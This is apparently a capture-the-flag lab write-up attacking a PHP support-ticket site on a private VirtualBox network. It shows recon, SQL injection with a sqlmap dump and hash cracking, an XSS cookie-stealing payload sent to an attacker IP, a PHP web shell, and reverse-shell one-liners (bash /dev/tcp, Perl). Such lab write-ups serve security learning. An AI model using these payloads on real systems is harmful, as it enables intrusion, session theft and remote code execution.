# Recon :
`nmap -p- 192.168.56.20`

Only 22 and 80 answer

`nmap -sV -sC 192.168.56.20`

```
	PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:1b:f7:39:5b:ef:ae:13:b1:49:f1:48:18:d8:b2:e7 (ECDSA)
|_  256 b3:4e:06:ac:84:61:24:e0:2e:7a:4f:6a:9f:a0:9e:09 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Support Center
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:05:15:39 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Site is written in php we can list all routes

`gobuster dir -u http://192.168.56.20/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 2716]
/login.php            (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.56.20/uploads/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.56.20/assets/]
/includes             (Status: 301) [Size: 317] [--> http://192.168.56.20/includes/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.56.20/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/ticket.php           (Status: 302) [Size: 2170] [--> index.php]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

We can inject the search field with `' OR 1=1 ; -- -` to get all the entries

Using `sqlmap -u http://192.168.56.20/ --data="search=aa&submit=Search" --dump` we get the whole database, including passzord hashes
Other possibility : store the whole request from burpsuite in a .txt and pass it to `sqlmap -r req.txt --dump`

Sqlmap is nice so it can immediately crack passwords.
If we pass the rockyou wordlist, john's password is weak and gets cracked

```
+----+----------+-------------------------------------------------+---------------+
| id | format   | password                                        | username      |
+----+----------+-------------------------------------------------+---------------+
| 1  | raw-md5  | 4fd1f1d82763c1f4c27327e8f36d6294                | administrator |
| 2  | raw-md5  | ba54f1d5fc61016e49a222d0ab6fd671 (notthisagain) | john          |
+----+----------+-------------------------------------------------+---------------+
```

We can grab the hashes instead and crack them manually.

`john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/sqlmapf5_1nn1r13978/sqlmaphashes-t79jemk6.txt --format=raw-md5`

Now login as john, and the ticket system is weak to a XSS attack.
Write
```
<script>
fetch('http://192.168.56.3/?a='+document.cookie)
</script>
```

as the tocket content, that will make the admin exfiltrate their cookies to us.
In your terminal `python3 -m http.server 80` will allow us to catch incoming http requests

After a few minutes the admin reads the ticket which triggers the attack, we then get
`192.168.56.20 - - [15/Dec/2025 15:08:16] "GET /?a=PHPSESSID=p4hvegsrht8lnhguaph727s9cae45q6kk HTTP/1.1" 200 -`

We now have the session id of the admin, we just have to insert it in our own cookies to become the admin.

We can then upload a php revshell as a new ticket and open it (we can only open the files as the admin)

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Well played we have a shell

We can then execute a perl shell to have a proper "ssh-like" shell :

On the host : `nc -lvp 4444`
On the web shell : `sh -i >& /dev/tcp/192.168.56.3/4444 0>&1` (well this one usually works but here no so plan B)

Actually on the web shell : `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.56.3:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

Still doesn't work, maybe a firewall problem, let's try port 443

On the host : `nc -lvp 443`
On the web shell : `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.56.3:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`

Now we have to stabilize it :

Execute `/usr/bin/script -qc /bin/bash /dev/null` in the revshell
Then Ctlr-Z, then `stty raw -echo && fg` then Enter Enter

`cd ../.. && ls` we have our flag.txt !

There is still stuff to do around privilege escalation (user )
